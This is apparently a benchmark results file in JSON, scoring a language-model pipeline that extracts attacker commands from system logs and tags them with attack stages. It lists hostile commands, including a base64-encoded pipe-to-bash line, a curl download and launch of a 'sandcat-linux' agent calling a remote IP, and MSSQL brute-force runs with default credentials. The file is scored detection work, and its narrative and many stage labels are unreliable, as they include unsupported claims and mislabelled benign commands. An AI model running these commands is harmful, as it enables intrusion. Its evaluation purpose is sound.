@@ -1,0 +1,226 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "echo d2hvYW1pJmlmY29uZmlnJmFycCAtYSZwaW5nIC1jIDEgMTAuNjcuMjAwLjIwMA== | base64 -d|bash",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "bash -c curl -O  http://124.223.85.207:8079/sandcat-linux ; chmod +x sandcat-linux ;nohup ./sandcat-linux -server https://124.223.85.207:8443 -opid 9f726796-b4f3-463f-8cfd-4f1498314252 -v > /dev/null 2>&1 &",
+        "stage": "Execution"
+      },
+      {
+        "command": "bash -c echo start:454b7093-cc6e-484e-9c42-e222c6906204",
+        "stage": "Collection"
+      },
+      {
+        "command": "bash -c echo start:2f0fd9e3-adf3-4ed6-a11a-3a373265cc46",
+        "stage": "Collection"
+      },
+      {
+        "command": "bash -c echo start:44f82419-f227-421a-ac65-625841c69df5",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "kill -9 $(lsof -i:8080 -t) ; nohup timeout 600 python -m SimpleHTTPServer 8079 > /dev/null 2>&1 &",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "mkdir -p fscan && unzip -o -d ./fscan fscan-main.zip && chmod +x ./fscan/main && ./fscan/main -m mssql -h 192.168.0.0/24 -user sa -pwd Sa123456",
+        "stage": "Discovery"
+      },
+      {
+        "command": "del /f /usr/tomcat/apache-tomcat-8.5.76//webapps/ROOT/logout.txt",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "del /f /q c:\\windows\\logout.jsp",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "./sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --enable",
+        "stage": "Persistence"
+      },
+      {
+        "command": "./sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --exec whoami",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "echo start:152d302e-4a34-48a4-b32b-16c0b3e73f15",
+        "stage": "Collection"
+      },
+      {
+        "command": "echo start:1185e211-d897-42e4-bb2d-7260f0eba801",
+        "stage": "Collection"
+      },
+      {
+        "command": "./sqltool_amd64_upx --server 192.168.0.244 --user sa --password Sa123456 --enable",
+        "stage": "Persistence"
+      },
+      {
+        "command": "./sqltool_amd64_upx --server 192.168.0.244 --user sa --password Sa123456 --exec whoami",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "echo start:3d4c5b71-9d0b-427b-9ddf-5bb208e30119",
+        "stage": "Collection"
+      },
+      {
+        "command": "rm ./sqltool_amd64_upx ; rm /tmp/sandcat-linux -r ; rm #{collection.path.name}/webapps/ROOT/logout.jsp -r",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "echo start:b3033461-3342-4b36-87af-780ffe63cd09",
+        "stage": "Collection"
+      },
+      {
+        "command": "echo start:e147423c-b478-4291-8866-115c380e19a0",
+        "stage": "Collection"
+      },
+      {
+        "command": "echo start:7435be5b-e9e8-44de-83b8-6141cbd01bea",
+        "stage": "Collection"
+      },
+      {
+        "command": "echo start:99765d80-531b-400d-a6e8-d3220a4c1d18",
+        "stage": "Collection"
+      },
+      {
+        "command": "echo start:3d4c5b71-9d0b-427b-9ddf-5bb208e30119",
+        "stage": "Collection"
+      },
+      {
+        "command": "sh -c \"echo d2hvYW1pJmlmY29uZmlnJmFycCAtYSZwaW5nIC1jIDEgMTAuNjcuMjAwLjIwMA== | base64 -d|bash\"",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "sh -c ls -l /proc/[0-9]*/fd/[0-9]* | grep socket:",
+        "stage": "Discovery"
+      },
+      {
+        "command": "echo start:b3033461-3342-4b36-87af-780ffe63cd09",
+        "stage": "Collection"
+      },
+      {
+        "command": "bash -c \"if [[ -f /usr/bin/lsb_release ]];then /usr/bin/lsb_release -a | grep Description | awk -F : '{print $2}' | sed 's/^[ \\t]*//g'; elif [[ -f / etc/system-release ]];then cat /etc/system-release | sed -n '1p'; else cat /etc/issue | sed -n '1p'; fi\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "sh -c /root/.vscode-server/bin/ccbaa2d27e38e5afa3e5c21c1c7bef4657064247/out/bootstrap-fork --type=ptyHost",
+        "stage": "Execution"
+      },
+      {
+        "command": "sh -c echo start:21877a4d-70ea-41fa-beec-ab7eb48011b5",
+        "stage": "Collection"
+      },
+      {
+        "command": "sh -c echo start:453bedf1-902e-45a1-96bf-2ef7690ac395",
+        "stage": "Collection"
+      },
+      {
+        "command": "/bin/sh",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "sh -c install -d -o man -g man -m 0755 /var/cache/man",
+        "stage": "Execution"
+      },
+      {
+        "command": "sh -c install -d -o man -g man -m 0755 /var/cache/man",
+        "stage": "Execution"
+      },
+      {
+        "command": "sh -c find /var/cache/man -type f -name *.gz -atime +6 -delete",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "sh -c logrotate /etc/logrotate.conf",
+        "stage": "Execution"
+      },
+      {
+        "command": "sh -c mandb --quiet",
+        "stage": "Execution"
+      },
+      {
+        "command": "sh -c fwupdmgr refresh --no-metadata-check",
+        "stage": "Execution"
+      },
+      {
+        "command": "sh -c fwupd",
+        "stage": "Execution"
+      },
+      {
+        "command": "sh -c apt-helper wait-online",
+        "stage": "Execution"
+      },
+      {
+        "command": "sh -c systemctl is-active -q systemd-networkd.service",
+        "stage": "Discovery"
+      },
+      {
+        "command": "sh -c systemctl is-active -q NetworkManager.service",
+        "stage": "Discovery"
+      },
+      {
+        "command": "lsof -i:8080 -t",
+        "stage": "Discovery"
+      },
+      {
+        "command": "bash -c kill -9 $(lsof -i:8080 -t) ; nohup timeout 600 python -m SimpleHTTPServer 8079 > /dev/null 2>&1 &",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "bash -c echo start:44f82419-f227-421a-ac65-625841c69df5",
+        "stage": "Collection"
+      },
+      {
+        "command": "bash -c echo start:2f0fd9e3-adf3-4ed6-a11a-3a373265cc46",
+        "stage": "Collection"
+      }
+    ],
+    "narrative": "Attackers exploited machines using various methods including an unknown mechanism involving base64 decoded bash script, SQL injection, and power shell commands. Once gaining the access, they established persistence and escalated privilege levels. Attackers continued gathering sensitive information by establishing collection behavior. Laterally  movement occurred via SSH connections. The attackers began downloading additional malicious software onto the infected computers.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 5,
+      "prompt_tokens": 44005,
+      "completion_tokens": 4707,
+      "total_tokens": 48712,
+      "wall_clock_s": 57.532,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.13636363636363635,
+      "recall": 0.6666666666666666,
+      "f1": 0.22641509433962262,
+      "tp": 6,
+      "fp": 38,
+      "fn": 3
+    },
+    "stage": {
+      "precision": 0.045454545454545456,
+      "recall": 0.25,
+      "f1": 0.07692307692307693,
+      "tp": 2,
+      "fp": 42,
+      "fn": 6,
+      "recall_partial": 0.35714285714285715
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 5,
+      "prompt_tokens": 44005,
+      "completion_tokens": 4707,
+      "total_tokens": 48712,
+      "wall_clock_s": 57.532,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v3_stagedefs",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe"
+  }
+}
